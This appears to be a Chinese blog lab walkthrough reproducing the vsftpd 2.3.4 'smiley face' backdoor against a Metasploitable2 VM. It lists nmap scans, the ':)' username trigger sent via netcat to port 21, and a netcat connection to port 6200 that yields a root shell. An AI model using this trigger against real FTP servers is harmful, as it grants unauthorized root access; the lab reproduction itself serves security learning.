---
title: "笑脸漏洞 Poc 复现"
---

## 一、笑脸漏洞 Poc 复现

1. 打开kali虚拟机和Metasploitable2靶机。

2. 在kali的powershell里搜索ip地址

   ![图 1]({{ site.baseurl }}/assets/images/laughbug/laughbug-1.png)

3. 使用nmap扫描ip地址：

   ```bash
   nmap 192.168.140.0/24
   ```

   然后找到靶机的ip地址:192.168.140.131

   ![图 2]({{ site.baseurl }}/assets/images/laughbug/laughbug-2.png)

   发现21端口开放。

4. 查询服务器版本：

   ```bash
   nmap -sV 192.168.140.131
   ```

   ![图 3]({{ site.baseurl }}/assets/images/laughbug/laughbug-3.png)

   **扫描结果：21端口的版本为:vsftpd 2.3.4**

5. 接下来查看6200端口的开放情况：

   powershell输入：

   ```bash
   nmap -Pn -p6200 192.168.140.131
   ```

   ![图 4]({{ site.baseurl }}/assets/images/laughbug/laughbug-4.png)

   发现6200端口暂未开放。

6. 利用瑞士小军刀（netcat），连接21端口：

   ```bash
   nc 192.168.140.131
   ```

   然后登录:

   ```text
   user 1100:)  (一定要有:)符号，才能触发笑脸漏洞)
   pass 1100
   ```

   ![图 5]({{ site.baseurl }}/assets/images/laughbug/laughbug-5.png)

   登录成功后，回头再查看6200端口的开放情况：

   ![图 6]({{ site.baseurl }}/assets/images/laughbug/laughbug-6.png)

   这里可以看到6200端口已开放，说明已经触发了笑脸漏洞。

7. 用netcat连接靶机的6200端口：

   ```bash
   nc 192.168.140.131 6200
   ```

   ![图 7]({{ site.baseurl }}/assets/images/laughbug/laughbug-7.png)

   **root说明笑脸漏洞复现已成功**

8. 附上笑脸漏洞源码的部分代码：

   ![图 8]({{ site.baseurl }}/assets/images/laughbug/laughbug-8.png)
